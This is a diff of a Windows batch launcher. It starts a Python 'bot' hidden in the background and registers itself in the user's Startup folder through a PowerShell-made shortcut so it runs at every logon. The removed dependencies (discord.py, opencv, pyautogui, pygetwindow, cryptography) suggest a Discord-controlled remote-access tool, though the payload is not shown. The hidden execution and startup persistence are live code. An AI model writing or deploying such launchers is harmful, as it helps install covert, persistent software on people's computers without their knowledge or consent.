@@ -33,16 +33,6 @@ if not exist %PYTHON_SCRIPT_PATH% (
     exit /b 1
 )
 
-REM Install required Python packages
-pip install discord.py
-pip install cryptography
-pip install requests
-pip install opencv-python
-pip install numpy
-pip install pillow
-pip install pygetwindow
-pip install pyautogui
-
 REM Run the Python bot script using pythonw to keep it hidden
 start /B pythonw.exe %PYTHON_SCRIPT_PATH%
 
@@ -53,9 +43,9 @@ if %errorlevel% neq 0 (
     exit /b 1
 )
 
-REM Add the batch script to the startup folder with a hidden shortcut
+REM Add the batch script to the startup folder
 set SCRIPT_PATH=%~f0
 set SHORTCUT_PATH=%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\%~n0.lnk
-powershell -Command "$ws = New-Object -ComObject WScript.Shell; $s = $ws.CreateShortcut('%SHORTCUT_PATH%'); $s.TargetPath = '%SCRIPT_PATH%'; $s.WindowStyle = 1; $s.Save()"
+powershell -Command "$ws = New-Object -ComObject WScript.Shell; $s = $ws.CreateShortcut('%SHORTCUT_PATH%'); $s.TargetPath = '%SCRIPT_PATH%'; $s.Save()"
 
 exit
